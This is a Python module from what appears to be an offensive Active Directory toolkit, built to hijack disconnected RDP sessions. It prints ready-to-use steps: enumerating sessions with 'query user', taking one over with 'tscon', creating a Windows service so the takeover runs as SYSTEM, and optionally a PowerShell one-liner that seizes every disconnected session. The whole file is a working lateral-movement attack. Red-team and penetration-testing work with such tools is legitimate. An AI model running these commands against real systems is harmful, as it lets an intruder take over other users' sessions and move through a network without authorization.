"""RDP session hijacking  -  take over disconnected RDP sessions."""

from typing import Any

MANIFEST = {
    "capability_id": "adxpl.lateral.rdp_hijack.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["session_hijack", "remote_access"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1563.002"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    target = getattr(args, "target", None)

    print(f"[*] RDP Session Hijack: {target}")
    print("[*] Requires SYSTEM privileges on target")

    commands = [
        ("Enumerate sessions", "query user"),
        ("Hijack session (as SYSTEM)", "tscon <SESSION_ID> /dest:rdp-tcp#<YOUR_SESSION>"),
        ("Alternative via service", 'sc create sesshijack binpath="cmd /k tscon <ID> /dest:rdp-tcp#0"'),
    ]

    print("\n[*] RDP Hijack steps:")
    for desc, cmd in commands:
        print(f"  {desc} : {cmd}")

    generate = getattr(args, "generate", False) if hasattr(args, "generate") else False
    if generate:
        print("\n[*] PowerShell one-liner (requires SYSTEM):")
        ps = 'query user | ForEach-Object { if($_ -match "Disc") { $id = ($_ -split "\\s+")[3]; tscon $id /dest:console }}'
        print(f"  {ps}")

    return 0
